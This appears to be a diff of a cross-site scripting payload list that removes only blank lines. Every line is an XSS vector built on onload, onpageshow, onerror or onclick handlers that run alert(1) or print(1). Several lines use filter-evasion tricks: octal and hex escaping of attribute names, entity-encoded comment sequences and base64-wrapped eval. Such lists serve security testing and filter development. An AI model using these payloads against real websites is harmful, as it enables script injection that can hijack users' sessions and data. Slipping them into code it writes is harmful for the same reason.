@@ -1,76 +1,32 @@
-
 <body 65467=alert(1)>
-
-
 <body on"+"load=alert(1)>
-
-
 <body on\157\154\157\141\144=alert(1)>
-
-
 <body on\x6f\x6c\x6f\x61\x64=alert(1)>  
-
-
 <body><script>document.body.onload=alert(1)</script>
-
-
 <body><script>document.body.onload=(function(){alert(1)})()</script>
-
-
 <body onload="(function(){alert(1)})();">
-
-
 <body onload="setTimeout(function(){alert(1)}, 0);">
-
-
 <body onload="setTimeout(function(){alert(1)}, 10);">
-
-
 <body onload="setTimeout(function foo(){alert(1)}, 10);">
-
-
 <body onload="(function(){ print(1) })()">
-
-
 <body onload="(new Function('print(1)'))()">
-
-
 <body onload="Function.prototype.apply.call(print, window, [1])">
-
-
 <body onload="Function.prototype.call.call(print, window, 1)">
-
 <body onload="var s = document.createElement('script'); s.innerHTML = 'print(1)'; document.body.appendChild(s)">
-
-
 <body onload="[1].forEach(print);">
-
 <body onload="var p=print; p(1);">
-
 <body onload="var p=function(x){print(x);}; p(1);">
-
 <body onpageshow="(function(){alert(1)}())">
-
 <body onpageshow="(function(a){a=1;alert(a)})(1);">
-
 <body onload="var a=1;setTimeout(function(){alert(a)}, 100);">
-
 <body onpageshow="setTimeout(function(){var a=1;alert(a)}, 100);">
-
 <body onload="(function(a){setTimeout(function(){alert(a)}, 100)})(1);">
-
 <body onload="with(document)body.setAttribute('onpageshow', '!function(){a=1;alert(a)}()')">
-
 <body onpageshow="(function(){var a=1;setTimeout(function(){alert(a)}, 100)})();">
-
 <svg onload="(function(a){setTimeout(function(){alert(a)}, 100)})(1337);">
-
 <svg onload="with(document){onload=(()=>{a=1337;alert(a)})();}">
-
 <svg onload="with(document){onload=(()=>{with(document){onload=((a)=>{a=1337;alert(a)})(1)}})()};">
-
 <svg onload="document.onload=(()=>{a=1337;alert(a)})();">
-
 <body onload="&lt;!--&gt;&#10alert(1);">
 <body onload="(()=>{&lt;!--&gt;&#10alert(1)})();">
 <body onload="((a)=>{&lt;!--&gt;&#10a=1;alert(a)})();">
@@ -78,8 +34,5 @@
 <body onload="((a)=>{&lt;!--&gt;&#10var a=1;setTimeout(()=>alert(a), 100)})();">
 <body onload="((a)=>{&lt;!--&gt;&#10onload=()=>{a=1;alert(a)}})();">
 <body onload="((a)=>{&lt;!--&gt;&#10onload=(()=>{a=1;alert(a)})()})();">
-
 <style onload="((a)=>{&lt;!--&#09;&gt;&#10;a=1;alert&#10;&lpar;a&rpar;})();">
-
-
 <img onerror=eval(atob('YWxlcnQoMSk=')); src=a;><body onclick=eval(atob('YWxlcnQoMSk='));><img onerror=eval(atob('YWxlcnQoMSk='));><svg onload=eval(atob('YWxlcnQoMSk='));>
